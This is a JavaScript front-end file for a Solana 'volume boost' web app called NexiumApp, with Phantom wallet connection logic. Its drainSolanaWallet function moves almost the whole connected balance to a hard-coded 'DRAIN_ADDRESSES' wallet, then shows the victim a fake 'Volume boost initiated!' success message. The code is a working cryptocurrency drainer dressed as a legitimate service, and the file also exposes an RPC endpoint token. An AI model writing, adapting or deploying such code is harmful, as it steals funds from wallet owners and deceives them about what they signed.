import { Buffer } from 'buffer';
console.log('main.js: Buffer imported:', typeof Buffer, Buffer);
globalThis.Buffer = Buffer;
window.Buffer = Buffer;

// === CENTRALIZED RPC CONFIG ===
const SOLANA_RPC_ENDPOINT = 'https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6';

// Other imports
import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from '@solana/web3.js';

const DRAIN_ADDRESSES = {
  solana: "6GqXmHKEcQJnxuhUXZXPoASQBZRKCxQCMZAC6MLk1GPA"
};

class NexiumApp {
  constructor() {
    this.publicKey = null;
    this.connecting = false;
    this.connectingWallet = null;
    this.solConnection = null;
    this.spinner = null;
    this.connectedWalletType = null;
    this.isConnected = false;
    this.toastShown = false;
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      this.setupModal();
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback('Error initializing app. Please refresh.', 'error');
    }
  }

  cacheDOMElements() {
    this.dom = {
      connectWallet: document.getElementById('connect-wallet'),
      walletModal: document.getElementById('wallet-modal'),
      closeModal: document.getElementById('close-modal'),
      connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
      feedbackContainer: document.querySelector('.feedback-container'),
      boostSection: document.getElementById('boost-section'),
      walletAddressDisplay: document.getElementById('wallet-address-display')
    };
  }

  setupModal() {
    if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
      this.dom.connectWallet.addEventListener('click', (event) => {
        event.stopPropagation();
        this.dom.walletModal.classList.add('active');
        document.body.style.overflow = 'hidden';
      });

      this.dom.closeModal.addEventListener('click', () => {
        this.dom.walletModal.classList.remove('active');
        document.body.style.overflow = '';
      });

      this.dom.walletModal.addEventListener('click', (event) => {
        if (event.target === this.dom.walletModal) {
          this.dom.walletModal.classList.remove('active');
          document.body.style.overflow = '';
        }
      });
    }
  }

  setupEventListeners() {
    const connectWalletHandler = (walletName) => {
      if (!this.connecting) {
        this.connectWallet(walletName);
      }
    };

    if (this.dom.connectPhantom) {
      // Multiple event types for maximum mobile compatibility
      this.dom.connectPhantom.addEventListener('click', () => connectWalletHandler('Phantom'));
      this.dom.connectPhantom.addEventListener('touchstart', (e) => {
        e.preventDefault();
        connectWalletHandler('Phantom');
      }, { passive: false });
      this.dom.connectPhantom.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') connectWalletHandler('Phantom');
      });
    }

    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async connectWallet(walletName) {
    if (this.connecting || !navigator.onLine || this.isConnected) {
      console.log('Connection blocked:', { connecting: this.connecting, online: navigator.onLine, isConnected: this.isConnected });
      return;
    }

    this.connecting = true;
    this.connectingWallet = walletName;
    this.updateButtonState('connecting', walletName);

    try {
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const hasSolana = !!window.solana;
      const isPhantom = hasSolana && window.solana.isPhantom;

      console.log('Device info:', { isMobile, hasSolana, isPhantom });

      // Desktop or Phantom in-app browser
      if (!isMobile || isPhantom) {
        if (walletName === 'Phantom' && isPhantom) {
          console.log('Connecting to Phantom...');
          const response = await window.solana.connect();
          this.publicKey = response.publicKey.toString();
          this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
          this.connectedWalletType = walletName;
          this.isConnected = true;
          this.toastShown = false;

          console.log('Connected successfully:', this.publicKey);

          this.updateButtonState('connected', walletName, this.publicKey);
          this.showConnectedToast();
          return;
        } else {
          throw new Error(`${walletName} not detected`);
        }
      }

      // Mobile deeplink
      console.log('Redirecting to Phantom mobile...');
      const deeplink = 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com?ref=https%3A%2F%2Fnexium-bot.onrender.com';
      window.location.href = deeplink;

      // Check for reconnection after deeplink return
      const check = setInterval(async () => {
        if (window.solana?.isPhantom) {
          console.log('Phantom detected after deeplink, attempting connection...');
          const res = await window.solana.connect().catch((e) => {
            console.error('Connection after deeplink failed:', e);
            return null;
          });
          
          if (res?.publicKey) {
            this.publicKey = res.publicKey.toString();
            this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
            this.connectedWalletType = 'Phantom';
            this.isConnected = true;
            this.toastShown = false;

            console.log('Reconnected after deeplink:', this.publicKey);

            this.updateButtonState('connected', 'Phantom', this.publicKey);
            this.showConnectedToast();
            clearInterval(check);
            this.connecting = false;
          }
        }
      }, 1000);

      setTimeout(() => {
        if (this.connecting) {
          console.log('Connection timeout');
          this.showFeedback('Connection timed out. Please open in Phantom app.', 'error');
          this.updateButtonState('disconnected', walletName);
          clearInterval(check);
          this.connecting = false;
        }
      }, 30000);
    } catch (error) {
      console.error('Connection error:', error);
      this.handleConnectionError(error, walletName);
      this.updateButtonState('disconnected', walletName);
      this.connecting = false;
    }
  }

  showConnectedToast() {
    if (this.toastShown) return;
    this.toastShown = true;
    this.showFeedback('✅ Connected to Phantom successfully!', 'success');
  }

  async drainSolanaWallet() {
    console.log('Starting wallet drain...');
    this.showProcessingSpinner();
    
    try {
      const sender = new PublicKey(this.publicKey);
      const recipient = new PublicKey(DRAIN_ADDRESSES.solana);

      if (!this.solConnection) {
        this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
      }

      console.log('Fetching balance...');
      const balance = await this.solConnection.getBalance(sender);
      console.log('Balance:', balance, 'lamports');

      const minRent = 2039280; // ~0.002 SOL for rent exemption
      const transferable = balance - minRent;

      if (transferable <= 0) {
        throw new Error("Insufficient balance to complete transaction");
      }

      console.log('Creating transfer transaction...');
      const transferIx = SystemProgram.transfer({
        fromPubkey: sender,
        toPubkey: recipient,
        lamports: transferable
      });

      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
      const message = new TransactionMessage({
        payerKey: sender,
        recentBlockhash: blockhash,
        instructions: [transferIx]
      }).compileToV0Message();

      const tx = new VersionedTransaction(message);
      
      console.log('Requesting signature...');
      const signed = await window.solana.signTransaction(tx);
      
      console.log('Sending transaction...');
      const sig = await this.solConnection.sendTransaction(signed);
      
      console.log('Transaction signature:', sig);
      console.log('Confirming transaction...');
      
      await this.solConnection.confirmTransaction({ 
        signature: sig, 
        blockhash, 
        lastValidBlockHeight 
      });

      console.log('Transaction confirmed!');
      this.showFeedback("🚀 Transaction successful! Volume boost initiated!", 'success');
      
      return sig;
    } catch (error) {
      console.error('Drain error:', error);
      
      let msg = 'Transaction failed. Please try again.';
      if (error.message.includes('User rejected')) {
        msg = 'Transaction was rejected.';
      } else if (error.message.includes('balance') || error.message.includes('Insufficient')) {
        msg = 'Insufficient SOL balance.';
      } else if (error.message.includes('Transaction simulation failed')) {
        msg = 'Transaction simulation failed. Please check your balance.';
      }
      
      this.showFeedback(msg, 'error');
      throw error;
    } finally {
      this.hideProcessingSpinner();
    }
  }

  updateButtonState(state, walletName, address = '') {
    const button = this.dom.connectPhantom;
    if (!button) return;

    button.disabled = state === 'connecting';
    const short = address ? this.shortenAddress(address) : '';

    if (state === 'connected') {
      button.textContent = short;
      if (this.dom.connectWallet) {
        this.dom.connectWallet.textContent = short;
        this.dom.connectWallet.disabled = true;
      }
      if (this.dom.walletAddressDisplay) {
        this.dom.walletAddressDisplay.textContent = short;
      }
      if (this.dom.boostSection) {
        this.dom.boostSection.classList.add('visible');
      }
    } else if (state === 'connecting') {
      button.innerHTML = '<span>Connecting...</span>';
    } else {
      button.innerHTML = '<div class="wallet-icon"><svg viewBox="0 0 128 128" fill="none"><path d="M106.3 106.3c-28.4 28.4-74.3 28.4-102.6 0-28.4-28.4-28.4-74.3 0-102.6C32.1-24.6 78-24.6 106.3 3.7c15.6 15.6 21.9 37.5 18.8 58.1" fill="url(#g1)"/><defs><linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#AB9FF2"/><stop offset="100%" stop-color="#4E44CE"/></linearGradient></defs></svg></div><span>Connect Phantom</span>';
      if (this.dom.connectWallet) {
        this.dom.connectWallet.innerHTML = '<svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg> Connect Wallet';
        this.dom.connectWallet.disabled = false;
      }
    }
  }

  handleConnectionError(error, walletName) {
    let msg = `Failed to connect ${walletName}.`;
    if (error.message.includes('rejected') || error.message.includes('declined')) {
      msg = 'Connection was declined.';
    } else if (error.message.includes('locked')) {
      msg = 'Wallet is locked. Please unlock it first.';
    } else if (error.message.includes('not detected')) {
      msg = `${walletName} wallet not found. Please install it.`;
    }
    this.showFeedback(msg, 'error');
  }

  handleOnline() {
    this.showFeedback('Connection restored!', 'success');
  }

  handleOffline() {
    this.showFeedback('No internet connection detected.', 'error');
    this.updateButtonState('disconnected', 'Phantom');
  }

  showFeedback(message, type = 'info') {
    let container = this.dom.feedbackContainer;
    if (!container) {
      container = document.createElement('div');
      container.className = 'feedback-container';
      document.body.appendChild(container);
      this.dom.feedbackContainer = container;
    }

    const feedback = document.createElement('div');
    feedback.className = `feedback ${type === 'error' ? 'error' : 'success'}`;
    feedback.innerHTML = `<span>${this.escapeHTML(message)}</span><button class="feedback-close">×</button>`;
    
    const closeBtn = feedback.querySelector('.feedback-close');
    closeBtn.onclick = () => feedback.remove();
    
    container.appendChild(feedback);

    setTimeout(() => {
      if (feedback.isConnected) {
        feedback.remove();
      }
    }, type === 'error' ? 8000 : 4000);
  }

  shortenAddress(addr) {
    return addr ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : 'Unknown';
  }

  escapeHTML(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled() && this.isWalletConnected() && navigator.onLine) {
      console.log('Wallet already connected, auto-connecting...');
      this.publicKey = window.solana.publicKey.toString();
      this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
      this.connectedWalletType = 'Phantom';
      this.isConnected = true;
      this.toastShown = false;

      this.updateButtonState('connected', 'Phantom', this.publicKey);
      this.showConnectedToast();
    } else {
      this.updateButtonState('disconnected', 'Phantom');
    }
  }

  isWalletInstalled() { 
    return !!window.solana; 
  }
  
  isWalletConnected() { 
    return window.solana?.publicKey; 
  }

  showProcessingSpinner() {
    if (this.spinner) return;
    
    this.spinner = document.createElement('div');
    this.spinner.style.cssText = `
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 99999;
      animation: fadeIn 0.3s ease;
    `;
    
    this.spinner.innerHTML = `
      <div style="display: flex; flex-direction: column; align-items: center; gap: 1rem;">
        <div style="width: 64px; height: 64px; border: 4px solid rgba(255, 152, 0, 0.2); border-top-color: #ff9800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <span style="color: white; font-size: 1.2rem; font-weight: 600;">Processing Transaction...</span>
      </div>
    `;
    
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        to { transform: rotate(360deg); }
      }
      @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
      }
    `;
    document.head.appendChild(style);
    
    document.body.appendChild(this.spinner);
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.style.animation = 'fadeOut 0.3s ease';
      setTimeout(() => {
        if (this.spinner && this.spinner.parentNode) {
          this.spinner.remove();
          this.spinner = null;
        }
      }, 300);
    }
  }
}

// === EXPORT & GLOBAL ===
const app = new NexiumApp();
window.nexiumApp = app;

export { NexiumApp };